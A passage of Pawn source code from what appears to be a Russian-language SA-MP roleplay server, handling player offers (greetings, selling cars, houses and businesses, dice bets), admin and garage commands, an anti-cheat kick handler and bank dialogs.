				SendClientMessage(to_player, 0x3399FFFF, fmt_str);

				SendMess(to_player, MSG_PLAYER_ACCESS);

				format(fmt_str, sizeof fmt_str, "Вы предложили %s вступить в семью", GetName(to_player));
				SendClientMessage(playerid, 0x3399FFFF, fmt_str);
			}
			case PROPOSITION_TYPE_DICE_CREDITS:
			{
				format(fmt_str, sizeof fmt_str, "Игрок %s предлагает Вам бросить кости на %d кредитов", GetName(playerid), value_1);
				SendClientMessage(to_player, 0x3399FFFF, fmt_str);

				SendMess(to_player, MSG_PLAYER_ACCESS);

				format(fmt_str, sizeof fmt_str, "Вы предложили %s бросить кости на %d кредитов", GetName(to_player), value_1);
				SendClientMessage(playerid, 0x3399FFFF, fmt_str);
			}
			case PROPOSITION_TYPE_FISHKI_MONEY:
			{
				format(fmt_str, sizeof fmt_str, "Игрок %s предлагает Вам бросить кости на %d рублей", GetName(playerid), value_1);
				SendClientMessage(to_player, 0x3399FFFF, fmt_str);

				SendMess(to_player, MSG_PLAYER_ACCESS);

				format(fmt_str, sizeof fmt_str, "Вы предложили %s бросить кости на %d рублей", GetName(to_player), value_1);
				SendClientMessage(playerid, 0x3399FFFF, fmt_str);
			}
			default: return 1;
		}

		proposition_info[playerid][P_OUT_ID] = to_player;

		proposition_info[to_player][P_ING_ID] = playerid;
		proposition_info[to_player][P_INCOMING_TYPE] = type;

		proposition_info[to_player][P_INCOMING_VALUE][0] = value_1;
		proposition_info[to_player][P_INCOMING_VALUE][1] = value_2;

	}
	else SendClientMessage(playerid, 0xFFFFFFFF, "Используйте {FF9900}/cancel {FFFFFF}чтобы отозвать предыдущее предложение");

	return 1;
}

CMD:yes(playerid, params[])
{
	new proposition_id = proposition_info[playerid][P_ING_ID];
	new offer_type = proposition_info[playerid][P_INCOMING_TYPE];

	new value_1 = proposition_info[playerid][P_INCOMING_VALUE][0];
	//new value_2 = proposition_info[playerid][P_INCOMING_VALUE][1];

	if(proposition_id != INVALID_PLAYER_ID)
	{
		if(IsPlayerConnected(proposition_id))
		{
			if(proposition_info[proposition_id][P_OUT_ID] == playerid)
			{
				proposition_info[proposition_id] = g_proposition_default_values;
			}
			else offer_type = -1;

			new Float: x, Float: y, Float: z;
			new Float: dist;

			GetPlayerPos(proposition_id, x, y, z);
			dist = GetPlayerDistanceFromPoint(playerid, x, y, z);

			if(dist <= 10.0)
			{
				new fmt_str[144];

				switch(offer_type)
				{
					case PROPOSITION_TYPE_KISS:
					{
						if(!(IsPlayerInAnyVehicle(playerid) && IsPlayerInAnyVehicle(proposition_id)))
						{
							if(0.5 <= dist <= 1.5)
							{
								new Float: to_x, Float: to_y;
								new Float: angle;

								GetPlayerPos(playerid, to_x, to_y, z);
								angle = _GetAngleToPoint(x, y, to_x, to_y);

								SetPlayerFacingAngle(playerid, angle);
								SetPlayerFacingAngle(proposition_id, angle + 180.0);

								format(fmt_str, sizeof fmt_str, "поцеловал(а) %s", GetName(proposition_id));

								MeAction(playerid, fmt_str);

								ApplyAnimation(proposition_id, "BD_FIRE","GRLFRD_KISS_03",4.0,0,0,0,0,0,1);
								ApplyAnimation(playerid, "BD_FIRE","PLAYA_KISS_03",4.0,0,0,0,0,0,1);
							}
							else SendClientMessage(playerid, 0xCECECEFF, "Вы слишком далеко от игрока");
						}
						else SendClientMessage(playerid, 0xCECECEFF, "Вы либо игрок не должны находиться в транспорте");
					}
					case PROPOSITION_TYPE_HUG:
					{
						if(!(IsPlayerInAnyVehicle(playerid) && IsPlayerInAnyVehicle(proposition_id)))
						{
							if(0.5 <= dist <= 1.5)
							{
								new Float: to_x, Float: to_y;
								new Float: angle;

								GetPlayerPos(playerid, to_x, to_y, z);
								angle = _GetAngleToPoint(x, y, to_x, to_y);

								SetPlayerFacingAngle(playerid, angle);
								SetPlayerFacingAngle(proposition_id, angle + 180.0);

								format(fmt_str, sizeof fmt_str, "обнял(а) %s", GetName(proposition_id));

								MeAction(playerid, fmt_str);

								ApplyAnimation(proposition_id, "BD_FIRE","GRLFRD_KISS_03",4.0,0,0,0,0,0,1);
								ApplyAnimation(playerid, "BD_FIRE","PLAYA_KISS_03",4.0,0,0,0,0,0,1);
							}
							else SendClientMessage(playerid, 0xCECECEFF, "Вы слишком далеко от игрока");
						}
						else SendClientMessage(playerid, 0xCECECEFF, "Вы либо игрок не должны находиться в транспорте");
					}
					case PROPOSITION_TYPE_HI:
					{
						if(!(IsPlayerInAnyVehicle(playerid) && IsPlayerInAnyVehicle(proposition_id)))
						{
							if(0.5 <= dist <= 1.5)
							{
								new Float: to_x, Float: to_y;
								new Float: angle;

								GetPlayerPos(playerid, to_x, to_y, z);
								angle = _GetAngleToPoint(x, y, to_x, to_y);

								SetPlayerFacingAngle(playerid, angle);
								SetPlayerFacingAngle(proposition_id, angle + 180.0);

								format(fmt_str, sizeof fmt_str, "пожал(а) руку %s", GetName(proposition_id));

								MeAction(playerid, fmt_str);

								ApplyAnimation(proposition_id,"GANGS","hndshkfa",4.0,0,0,0,0,0);
								ApplyAnimation(playerid,"GANGS","hndshkfa",4.0,0,0,0,0,0);
							}
							else SendClientMessage(playerid, 0xCECECEFF, "Вы слишком далеко от игрока");
						}
						else SendClientMessage(playerid, 0xCECECEFF, "Вы либо игрок не должны находиться в транспорте");
					}
					case PROPOSITION_TYPE_SELL_CAR:
					{
						if(0.5 <= dist <= 5.0)
						{
							if(g_player_car[proposition_id] == INVALID_VEHICLE_ID)
								return 1;

							new fmt_query[120],
								vehicleid = g_player_car[proposition_id];

							if(GetMoney(proposition_id) + value_1 > 999999999)
								return SendClientMessage(proposition_id, C_RED, "Больше 1000000000 рублей запрещено иметь на руках");

							new  Float: car_x, Float: car_y, Float: car_z;
							GetVehiclePos(vehicleid, car_x, car_y, car_z);

							if(!(IsPlayerInRangeOfPoint(playerid, 10.0, car_x, car_y, car_z) && IsPlayerInRangeOfPoint(proposition_id, 10.0, car_x, car_y, car_z)))
								return SendClientMessage(proposition_id, 0xCECECEFF, "Вы и продавец должны находиться около ТС");

							if(GetMoney(playerid) < value_1)
								return SendMess(playerid, MSG_NOT_MONEY);

							GiveMoney(proposition_id, value_1, "Продажа ТС");
							GiveMoney(playerid, -value_1, "Покупка ТС");

							format(fmt_query, sizeof fmt_query, "%s успешно продам Вам %s (%d) за %d рублей", GetName(proposition_id), g_vehicle_info[GetVehicleModel(vehicleid) - 400][VI_NAME], GetVehicleModel(vehicleid), value_1);
							SendClientMessage(playerid, 0x66CC00FF, fmt_query);

							format(fmt_query, sizeof fmt_query, "UPDATE ownable_cars SET owner_name='%s' WHERE `id` = '%d'", GetName(playerid), g_vehicle[vehicleid][veh_sql_id]);
							mysql_query(dbHandle, fmt_query);

							PI[proposition_id][P_OWNABLE_CAR][GetVehicleData(vehicleid, veh_slot)-1] = INVALID_VEHICLE_ID;

							SetVehicleData(vehicleid, veh_driver_id, INVALID_PLAYER_ID);

							ClearVehicleData(vehicleid);

							DestroyVehicleEx(vehicleid);

							g_vehicle[vehicleid] = g_vehicle_default_values;

							format(fmt_query, sizeof fmt_query, "Вы продали свой транспорт игроку %s за %d руб", GetName(playerid), value_1);
							SendClientMessage(proposition_id, 0x66CC00FF, fmt_query);

						}
						else SendClientMessage(playerid, 0xCECECEFF, "Вы слишком далеко от игрока");
					}
					case PROPOSITION_TYPE_SELL_HOUSE:
					{
						if(!(IsPlayerInAnyVehicle(playerid) && IsPlayerInAnyVehicle(proposition_id)))
						{
							if(0.5 <= dist <= 5.0)
							{
								if(GetMoney(proposition_id) + value_1 > 1000000000)
									return SendClientMessage(proposition_id, C_RED, "Больше 1000000000 рублей запрещено иметь на руках");

								if(GetMoney(playerid) < value_1)
									return SendMess(playerid, MSG_NOT_MONEY);

								GiveMoney(playerid, -value_1);
								GiveMoney(proposition_id, value_1);

								new fmt_query[60+MAX_PLAYER_NAME];

								format(fmt_query, sizeof fmt_query, "UPDATE house SET hOwner='%s' WHERE hOwner='%s'", GetName(playerid), GetName(proposition_id));
								mysql_query(dbHandle, fmt_query);

								strmid(HouseInfo[GetPVarInt(proposition_id, "PlayerHouse")][hOwner], GetName(playerid), 0, strlen(GetName(playerid)), MAX_PLAYER_NAME);
								HouseInfo[GetPVarInt(proposition_id, "PlayerHouse")][hLock] = 1;
								SetPVarInt(playerid, "PlayerHouse", GetPVarInt(proposition_id, "PlayerHouse"));
								DeletePVar(proposition_id, "PlayerHouse");

								format(fmt_query, sizeof fmt_query, "%s успешно продам Вам свой дом за %d рублей", GetName(proposition_id), value_1);
								SendClientMessage(playerid, 0x66CC00FF, fmt_query);

								format(fmt_query, sizeof fmt_query, "Вы успешно продали свой дом %s за %d рублей", GetName(playerid), value_1);
								SendClientMessage(proposition_id, 0x66CC00FF, fmt_query);
							}
							else SendClientMessage(playerid, 0xCECECEFF, "Вы слишком далеко от игрока");
						}
						else SendClientMessage(playerid, 0xCECECEFF, "Вы либо игрок не должны находиться в транспорте");
					}
					case PROPOSITION_TYPE_SELL_BUSINESS:
					{
						if(!(IsPlayerInAnyVehicle(playerid) && IsPlayerInAnyVehicle(proposition_id)))
						{
							if(0.5 <= dist <= 5.0)
							{
								if(GetMoney(proposition_id) + value_1 > 1000000000)
									return SendClientMessage(proposition_id, C_RED, "Больше 1000000000 рублей запрещено иметь на руках");

								if(GetMoney(playerid) < value_1)
									return SendMess(playerid, MSG_NOT_MONEY);

								GiveMoney(playerid, -value_1);
								GiveMoney(proposition_id, value_1);

								new fmt_query[60+MAX_PLAYER_NAME];

								format(fmt_query, sizeof fmt_query, "UPDATE bizz SET owner='%s' WHERE owner='%s'", GetName(playerid), GetName(proposition_id));
								mysql_query(dbHandle, fmt_query);

								strmid(BizzInfo[GetPVarInt(proposition_id, "PlayerBizz")][bOwner], GetName(playerid), 0, strlen(GetName(playerid)), MAX_PLAYER_NAME);

								UpdateBizz(GetPVarInt(proposition_id, "PlayerBizz"));

								SetPVarInt(playerid, "PlayerBizz", GetPVarInt(proposition_id, "PlayerBizz"));

								format(fmt_query, sizeof fmt_query, "%s успешно продам Вам свой бизнес за %d рублей", GetName(proposition_id), value_1);
								SendClientMessage(playerid, 0x66CC00FF, fmt_query);

								format(fmt_query, sizeof fmt_query, "Вы успешно продали свой бизнес %s за %d рублей", GetName(playerid), value_1);
								SendClientMessage(proposition_id, 0x66CC00FF, fmt_query);
							}
							else SendClientMessage(playerid, 0xCECECEFF, "Вы слишком далеко от игрока");
						}
						else SendClientMessage(playerid, 0xCECECEFF, "Вы либо игрок не должны находиться в транспорте");
					}
					case PROPOSITION_TYPE_SHOW_LIC:
					{
						if(!(IsPlayerInAnyVehicle(playerid) && IsPlayerInAnyVehicle(proposition_id)))
						{
							if(0.5 <= dist <= 5.0)
							{
								new fmt_info[90];

								format(fmt_info, sizeof fmt_info, "%s~n~%s~n~%s~n~%s",
								g_player_skills[playerid][S_LICS][0] == 1 ? ("~r~~h~~h~отсутствует") : ("~g~~h~~h~имеется"),
								g_player_skills[playerid][S_LICS][2] == 1 ? ("~r~~h~~h~отсутствует") : ("~g~~h~~h~имеется"),
								g_player_skills[playerid][S_LICS][3] == 1 ? ("~r~~h~~h~отсутствует") : ("~g~~h~~h~имеется"),
								g_player_skills[playerid][S_LICS][1] == 1 ? ("~r~~h~~h~отсутствует") : ("~g~~h~~h~имеется"));

								PlayerTextDrawSetString(playerid, TDEditor_LICPLAYER[playerid], fmt_info);

								SelectTextDraw(playerid, 0x009900FF);

								for(new i; i < sizeof TDEditor_LICGLOBAL; i ++) TextDrawShowForPlayer(playerid, TDEditor_LICGLOBAL[i]);
								PlayerTextDrawShow(playerid, TDEditor_LICPLAYER[playerid]);

								if(PI[playerid][pSex] == 1) format(fmt_info, sizeof(fmt_info), "показал свои лицензии %s", GetName(playerid));
								else format(fmt_info, sizeof(fmt_info), "показала свои лицензии %s", GetName(playerid));
								MeAction(proposition_id, fmt_info);

								SetPVarInt(playerid, "show_lic", 1);
							}
							else SendClientMessage(playerid, 0xCECECEFF, "Вы слишком далеко от игрока");
						}
						else SendClientMessage(playerid, 0xCECECEFF, "Вы либо игрок не должны находиться в транспорте");
					}
					case PROPOSITION_TYPE_SHOW_PASS:
					{
						if(!(IsPlayerInAnyVehicle(playerid) && IsPlayerInAnyVehicle(proposition_id)))
						{
							if(0.5 <= dist <= 5.0)
							{
								new id[3];

								format(id, sizeof id, "%d", playerid);

								callcmd::pass(proposition_id, id);
							}
							else SendClientMessage(playerid, 0xCECECEFF, "Вы слишком далеко от игрока");
						}
						else SendClientMessage(playerid, 0xCECECEFF, "Вы либо игрок не должны находиться в транспорте");
					}
					case PROPOSITION_TYPE_FAMILY_INVITE:
					{
						if(0.5 <= dist <= 10.0)
						{
							new familyid = PI[proposition_id][P_FAMILY];

							PI[playerid][P_FAMILY] = familyid;

							Iter_Add(FamilyMembers[familyid], playerid);

							STRING_GLOBAL[0] = EOS;
							format(STRING_GLOBAL, sizeof STRING_GLOBAL, "UPDATE accounts SET family=%d WHERE id=%d", familyid, PI[playerid][pID]);
							mysql_query(dbHandle, STRING_GLOBAL);

							new Cache:result;
							format(STRING_GLOBAL, sizeof STRING_GLOBAL, "SELECT name FROM family WHERE id = %d", familyid);
							result = mysql_query(dbHandle, STRING_GLOBAL);

							if(cache_num_rows())
							{
								new name[64];
								cache_get_field_content(0, "name", name);
								FamilyName[playerid] = CreateDynamic3DTextLabel(name, 0xFFFFFFFF, 0.0, 0.0, 0.5, 10.0, playerid);
							}
							cache_delete(result);

							STRING_GLOBAL[0] = EOS;
							format(STRING_GLOBAL, sizeof STRING_GLOBAL, "{3399FF}Вы успешно вступили в семью {ffcc00}\"%s\". {FFCC00}Доступные команды: {FFCC00}/cmd", GetFamilyData(familyid-1, F_NAME));
							SendClientMessage(playerid, 0x66CC00FF, STRING_GLOBAL);

							STRING_GLOBAL[0] = EOS;
							format(STRING_GLOBAL, sizeof STRING_GLOBAL, "Игрок %s согласился на Ваше предложение", GetName(playerid));
							SendClientMessage(proposition_id, 0x66CC00FF, STRING_GLOBAL);
						}
						else SendClientMessage(playerid, 0xCECECEFF, "Вы слишком далеко от игрока");
					}
					case PROPOSITION_TYPE_DICE_CREDITS:
					{
						if(0.5 <= dist <= 10.0)
						{
							if(PI[playerid][pCredits] < value_1)
								return SendClientMessage(playerid, C_RED, "У Вас недостаточно кредитов");

							if(PI[proposition_id][pCredits] < value_1)
								return SendClientMessage(proposition_id, C_RED, "У Вас недостаточно кредитов");

							new player_dice = random(6) + 1,
								to_player_dice = random(6) + 1,
								winner;

							if(player_dice > to_player_dice)
								winner = playerid;
							else if(player_dice < to_player_dice)
								winner = proposition_id;
							else
								winner = -1;

							STRING_GLOBAL[0] = EOS;

							format(STRING_GLOBAL, sizeof STRING_GLOBAL, "%s и %s бросили кости. Результат: {FFCD00}%d:%d", GetName(proposition_id), GetName(playerid), to_player_dice, player_dice);
							ProxDetector(13.0, playerid, STRING_GLOBAL, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);

							if(winner == -1)
							{
								STRING_GLOBAL[0] = EOS;
								format(STRING_GLOBAL, sizeof STRING_GLOBAL, "Выпало %d", player_dice);

								SetPlayerChatBubble(playerid, STRING_GLOBAL, COLOR_BLUE, 10.0, 3000);
								SetPlayerChatBubble(proposition_id, STRING_GLOBAL, COLOR_BLUE, 10.0, 3000);

								SendClientMessage(playerid, COLOR_YELLOW, "Игра закончилась в ничью");
								SendClientMessage(proposition_id, COLOR_YELLOW, "Игра закончилась в ничью");
							}
							else
							{
								new loser = playerid == winner ? proposition_id : playerid,
									winner_dice = playerid == winner ? player_dice : to_player_dice,
									loser_dice = playerid == winner ? to_player_dice : player_dice;

								SendClientMessage(winner, C_OSNOV, "Поздравляем, Вы выиграли!");
								PI[winner][pCredits] += value_1;
								PI[winner][pTotalCredits] += value_1;

								MysqlUpdatePlayerInt(winner, "credits", PI[winner][pCredits]);
								MysqlUpdatePlayerInt(winner, "totalcredits", PI[winner][pCredits]);

								SendClientMessage(loser, C_RED, "К сожалению, Вы проиграли");

								PI[loser][pCredits] -= value_1;
								PI[loser][pTotalCredits] -= value_1;

								MysqlUpdatePlayerInt(loser, "credits", PI[loser][pCredits]);
								MysqlUpdatePlayerInt(loser, "totalcredits", PI[loser][pCredits]);

								STRING_GLOBAL[0] = EOS;
								format(STRING_GLOBAL, sizeof STRING_GLOBAL, "Выпало: %d", winner_dice);
								SetPlayerChatBubble(winner, STRING_GLOBAL, C_OSNOV, 20.0, 2000);

								STRING_GLOBAL[0] = EOS;
								format(STRING_GLOBAL, sizeof STRING_GLOBAL, "Выпало: %d", loser_dice);
								SetPlayerChatBubble(loser, STRING_GLOBAL, C_RED, 20.0, 2000);
							}
						}
						else SendClientMessage(playerid, 0xCECECEFF, "Вы слишком далеко от игрока");
					}
					case PROPOSITION_TYPE_FISHKI_MONEY:
					{
						if(0.5 <= dist <= 10.0)
						{
							if(PI[playerid][pCash] < value_1)
								return SendClientMessage(playerid, C_RED, "У Вас недостаточно денег");

							if(PI[proposition_id][pCash] < value_1)
								return SendClientMessage(proposition_id, C_RED, "У Вас недостаточно денег");

							new player_dice = random(6) + 1,
								to_player_dice = random(6) + 1,
								winner;

							if(player_dice > to_player_dice)
									winner = playerid;
							else if(player_dice < to_player_dice)
								winner = proposition_id;
							else
								winner = -1;

							STRING_GLOBAL[0] = EOS;

							format(STRING_GLOBAL, sizeof STRING_GLOBAL, "%s и %s бросили кости. Результат: {FFCD00}%d:%d", GetName(proposition_id), GetName(playerid), player_dice, to_player_dice);
							ProxDetector(13.0, playerid, STRING_GLOBAL, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);

							if(winner == -1)
							{
								STRING_GLOBAL[0] = EOS;
								format(STRING_GLOBAL, sizeof STRING_GLOBAL, "Выпало %d", player_dice);

								SetPlayerChatBubble(playerid, STRING_GLOBAL, COLOR_BLUE, 10.0, 3000);
								SetPlayerChatBubble(proposition_id, STRING_GLOBAL, COLOR_BLUE, 10.0, 3000);

								SendClientMessage(playerid, COLOR_YELLOW, "Игра закончилась в ничью");
								SendClientMessage(proposition_id, COLOR_YELLOW, "Игра закончилась в ничью");
							}
							else
							{
								new loser = playerid == winner ? proposition_id : playerid,
									winner_dice = playerid == winner ? player_dice : to_player_dice,
									loser_dice = playerid == winner ? to_player_dice : player_dice;

								SendClientMessage(winner, C_OSNOV, "Поздравляем, Вы выиграли!");
								GiveMoney(winner, value_1, "Выигрыш казино");

								SendClientMessage(loser, C_RED, "К сожалению, Вы проиграли");
								GiveMoney(loser, -value_1, "Проигрыш казино");

								STRING_GLOBAL[0] = EOS;
								format(STRING_GLOBAL, sizeof STRING_GLOBAL, "Выпало: %d", winner_dice);
								SetPlayerChatBubble(winner, STRING_GLOBAL, C_OSNOV, 20.0, 2000);

								STRING_GLOBAL[0] = EOS;
								format(STRING_GLOBAL, sizeof STRING_GLOBAL, "Выпало: %d", loser_dice);
								SetPlayerChatBubble(loser, STRING_GLOBAL, C_RED, 20.0, 2000);
							}
						}
						else SendClientMessage(playerid, 0xCECECEFF, "Вы слишком далеко от игрока");
					}
				}
			}
			else SendClientMessage(playerid, 0x999999FF, "Игрок слишком далеко");
		}
		else SendClientMessage(playerid, 0x999999FF, "Игрок вышел из игры");

		proposition_info[playerid] = g_proposition_default_values;

		PI[proposition_id][pInteractionPlayer] = -1;
		PI[playerid][pInteractionPlayer] = -1;
	}

	return 1;
}

CMD:no(playerid, params[])
{
	new proposition_id = proposition_info[playerid][P_ING_ID];

	if(proposition_id != INVALID_PLAYER_ID)
	{
		if(proposition_info[proposition_id][P_OUT_ID] == playerid)
		{
			proposition_info[proposition_id] = g_proposition_default_values;

			new fmt_str[64];
			format(fmt_str, sizeof fmt_str, "%s отказался от Вашего предложения", GetName(playerid));
			SendClientMessage(proposition_id, 0xFF6600FF, fmt_str);

			format(fmt_str, sizeof fmt_str, "Вы отказались от предложения игрока %s", GetName(proposition_id));
			SendClientMessage(playerid, 0xFF6600FF, fmt_str);

			GameTextForPlayer(proposition_id, "~r~no", 4000, 1);
		}
		else SendClientMessage(playerid, 0xFF6600FF, "Вы отказались от предложения игрока");

		PI[proposition_id][pInteractionPlayer] = INVALID_PLAYER_ID;
		PI[playerid][pInteractionPlayer] = INVALID_PLAYER_ID;

		proposition_info[playerid] = g_proposition_default_values;
	}
	return 1;
}

CMD:cancel(playerid, params[])
{
	new proposition_id = proposition_info[playerid][P_OUT_ID];

	if(proposition_id != INVALID_PLAYER_ID)
	{
		if(proposition_info[proposition_id][P_ING_ID] == playerid)
		{
			proposition_info[proposition_id] = g_proposition_default_values;

			new fmt_str[64];
			format(fmt_str, sizeof fmt_str, "%s отозвал свое предложение", GetName(playerid));
			SendClientMessage(proposition_id, 0xFF6600FF, fmt_str);

			format(fmt_str, sizeof fmt_str, "Вы отозвали свое предложение для %s", GetName(proposition_id));
			SendClientMessage(playerid, 0xFF6600FF, fmt_str);
		}
		else SendClientMessage(playerid, 0xFF6600FF, "Вы отозвали свое последнее предложение");

		proposition_info[playerid] = g_proposition_default_values;

		PI[proposition_id][pInteractionPlayer] = INVALID_PLAYER_ID;
		PI[playerid][pInteractionPlayer] = INVALID_PLAYER_ID;
	}

	return 1;
}

stock GetPlayerSetting(playerid, setting)
{
	new fmt_str[5];

	format(fmt_str, sizeof fmt_str, "%s", Settings[playerid][setting] == 0 ? ("выкл") : ("вкл"));

	return fmt_str;
}

stock ShowPlayerImproveDialog(playerid)
{
    STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "%s\n%s\n%s\n%s\n{FFFFFF}Помощь",
	(PI[playerid][pImprove][0] != 1) ? ("{0099FF}1. {FFFFFF}Выносливость\t| {F04245}Не имеется (2 уровень и 50.000р)") : ("{0099FF}1. {FFFFFF}Выносливость\t| {63BD4E}Куплено"),
	(PI[playerid][pImprove][1] != 1) ? ("{0099FF}2. {FFFFFF}Решительность\t| {F04245}Не имеется (3 уровень и 75.000р)") : ("{0099FF}2. {FFFFFF}Решительность\t| {63BD4E}Куплено (/leave)"),
	(PI[playerid][pImprove][3] != 1) ? ("{0099FF}3. {FFFFFF}Мастер вождения\t| {F04245}Не имеется (10 уровень и 125.000р)") : ("{0099FF}3. {FFFFFF}Мастер вождения\t| {63BD4E}Куплено"));
	ShowPlayerDialog(playerid, D_JOB+177, DIALOG_STYLE_LIST, "Улучшения персонажа", STRING_GLOBAL, "Выбрать", "Назад");
	return 1;
}

stock IsPlayerDriver(playerid) // сидит ли игрок за рулем ТС
{
	return (IsPlayerInAnyVehicle(playerid) && GetPlayerState(playerid) == PLAYER_STATE_DRIVER);
}

CMD:sethousepos(playerid, params[])
{
	if(!IsPlayerDeveloperAdmin(playerid)) return 1;

    new house_id = -1;

	if(sscanf(params, "d", house_id)) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {ffffff}Введите: /sethousepos [id дома]");

	if(!(1 <= house_id <= TOTALHOUSE)) return SendClientMessage(playerid, COLOR_GREY, "Неверный ID дома");

	new Float: x,
		Float: y,
		Float: z,
		Float: angle;

	GetPlayerFacingAngle(playerid, angle);
	GetPlayerPos(playerid, x, y, z);

	printf("%f, %f, %f / %f, %f, %f", HouseInfo[house_id][hEntrx], HouseInfo[house_id][hEntry], HouseInfo[house_id][hEntrz], x, y, z);

	HouseInfo[house_id][hEntrx] = x;
	HouseInfo[house_id][hEntry] = y;
	HouseInfo[house_id][hEntrz] = z;

	HouseInfo[house_id][hExitx] = x + 1.5 * floatsin(-angle + 180, degrees);
	HouseInfo[house_id][hExity] = y + 1.5 * floatcos(-angle + 180, degrees);

	HouseInfo[house_id][hExitz] = z;

	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "UPDATE "T_HOUSE" SET hEntrx='%f', hEntry='%f', hEntrz='%f', hExitx='%f', hExity='%f', hExitz='%f' WHERE id = '%d' LIMIT 1", x, y, z, HouseInfo[house_id][hExitx], HouseInfo[house_id][hExity], z, HouseInfo[house_id][hID]);
	mysql_tquery(dbHandle, STRING_GLOBAL, "", "");

	printf("%s", STRING_GLOBAL);

	UpdateHouse(house_id);

	return 1;
}

CMD:repairveh(playerid, params[])
{
	if(GetPlayerGarage(playerid) == 0) return SendClientMessage(playerid, COLOR_GREY, "У Вас нет гаража");

	new garage_id = GetPVarInt(playerid, "in_garage");

	if(garage_id == 0) return SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться в своём гараже");

	new vehicleid = GetPlayerVehicleID(playerid);

	RepairVehicle(vehicleid);
	SetVehicleHealth(vehicleid, 1000.0);

	SendClientMessage(playerid, 0x66CC33FF, "Автомобиль успешно отремонтирован");

	return 1;
}

stock GetNearestGarage(playerid)
{
	new garage_id = -1,
	    Float: distance = 20000.0,
	    Float: x,
	    Float: y,
	    Float: z,
	    Float: g_x,
	    Float: g_y,
	    Float: g_z;

	GetPlayerPos(playerid, x, y, z);

	for(new idx = TOTALGARAGES; idx > 0; idx --)
	{
	    g_x = g_garages[idx][G_POS_X];
	    g_y = g_garages[idx][G_POS_Y];
	    g_z = g_garages[idx][G_POS_Z];

	    if(!IsPlayerInRangeOfPoint(playerid, (IsPlayerInAnyVehicle(playerid)) ? 5.0 : 3.0, g_x, g_y, g_z)) continue;

		new Float: t_distance = floatsqroot(floatpower(g_x - x, 2) + floatpower(g_y - y, 2) + floatpower(g_z - z, 2));

	    if(t_distance < distance)
	    {
	        distance = t_distance;

	        garage_id = idx;
	    }
	}

	return garage_id;
}

#if defined include_dac

public DAC_OnPlayerWarning(playerid, eDAC_Warnings:warnid, value)
{
	SendAntiCheatLog(playerid, warnid, value);

	switch(warnid)
	{
	    case DAC_On_Bike_Crash, DAC_Pizdarvanka: KickEx(playerid, dac_detection_name[warnid]);

	    case DAC_Teleport, DAC_Teleport_No_Move_Speed:
	    {

	        new vehicle = GetPlayerVehicleID(playerid);
			if(vehicle <= 0) return false;

			new Float: vehicle_pos[3];

			GetVehiclePos(vehicle, vehicle_pos[0], vehicle_pos[1], vehicle_pos[2]);
			SetVehiclePos(vehicle, vehicle_pos[0], vehicle_pos[1], vehicle_pos[2]);
			GetVehicleVelocity(vehicle, vehicle_pos[0], vehicle_pos[1], vehicle_pos[2]);
			SetVehicleVelocity(vehicle, vehicle_pos[0], vehicle_pos[1], vehicle_pos[2]);

			if(warnid == DAC_Teleport_No_Move_Speed) KickEx(playerid, dac_detection_name[warnid]);

			return false;
	    }
	}

	return false;
}

#endif


stock HidePlayerTuningMain(playerid)
{
	if(PI[playerid][P_TUNING_TYPE] != -1)
	{
		for(new idx; idx < 28; idx ++) TextDrawHideForPlayer(playerid, sto_td_global[idx]);
		for(new idx; idx < 3; idx ++) PlayerTextDrawHide(playerid, sto_td_player[idx][playerid]);
		SelectTextDraw(playerid, -1);

		CancelSelectTextDraw(playerid);
	}
}

stock ShowPlayerBankMenu(playerid)
{
	ShowPlayerDialog
	(
		playerid, DIALOG_BANK_MENU, DIALOG_STYLE_LIST,
		"{FFCC00}Меню банка",
		"Мои счета\n"\
		"Открыть новый счет",
		"Далее", "Отмена"
	);
}

stock ShowPlayerBankAccounts(playerid)
{
	new fmt_query[128];
	new Cache: result;
	new rows;
	new count;

	STRING_GLOBAL[0] = EOS;

	format(STRING_GLOBAL, sizeof STRING_GLOBAL, "SELECT * FROM bank_accounts WHERE owner_id=%d", PI[playerid][pID]);
	result = mysql_query(dbHandle, STRING_GLOBAL);

	rows = cache_num_rows();

	STRING_GLOBAL[0] = EOS;

	STRING_GLOBAL = "Название\t\tНомер\t\tБаланс\n";

	format(fmt_query, sizeof fmt_query, "{6b9cde}Основной счет{ffffff}\t\t----\t\t{6bb956}%d$\n", PI[playerid][pBank]);
	strcat(STRING_GLOBAL, fmt_query);

	for(new idx; idx < 8; idx ++)
	{
		ClearBankAccountInfo(playerid, idx);

		if(idx < rows)
		{
			g_bank_accounts[playerid][idx][B_ID] = cache_get_row_int(idx, 0);

			cache_get_row(idx, 2, g_bank_accounts[playerid][idx][B_NAME], dbHandle, 21);
			cache_get_row(idx, 4, g_bank_accounts[playerid][idx][B_PIN_CODE], dbHandle, 9);

			g_bank_accounts[playerid][idx][B_BALANCE] = cache_get_row_int(idx, 3);
			g_bank_accounts[playerid][idx][B_REG_TIME] = cache_get_row_int(idx, 5);

			format(fmt_query, sizeof fmt_query, "{ffffff}%s\t\t\t%d\t\t{6bb956}%d$\n", g_bank_accounts[playerid][idx][B_NAME], g_bank_accounts[playerid][idx][B_ID], g_bank_accounts[playerid][idx][B_BALANCE]);
			strcat(STRING_GLOBAL, fmt_query);

			g_player_listitem[playerid][count ++] = idx;
		}
	}

	cache_delete(result);

	ShowPlayerDialog
	(
		playerid, DIALOG_BANK_ACCOUNTS, DIALOG_STYLE_LIST,
		"{FFCD00}Ваши счета",
		STRING_GLOBAL,
		"Операции", "Назад"
	);

	return 1;
}

stock ClearBankAccountInfo(playerid, accountid)
{
	strcat(g_bank_accounts[playerid][accountid][B_NAME], "None");

	g_bank_accounts[playerid][accountid][B_ID] =
	g_bank_accounts[playerid][accountid][B_PIN_CODE] =
	g_bank_accounts[playerid][accountid][B_BALANCE] =
	g_bank_accounts[playerid][accountid][B_REG_TIME] = 0;
}

stock ShowPlayerBankPanel(playerid)
{
	ShowPlayerDialog
	(
		playerid, DIALOG_BANK_MAIN, DIALOG_STYLE_LIST,
		"{ffcc00}Основной счет",
		"1. Снять с банковского счета\n"\
		"2. Положить на банковский счет\n"\
		"3. Баланс банковского счета\n"\
		"4. Снять со счета предприятия\n"\
		"5. Положить на счет предприятия\n"\
		"6. Пополнить счет мобильного телефона\n"\
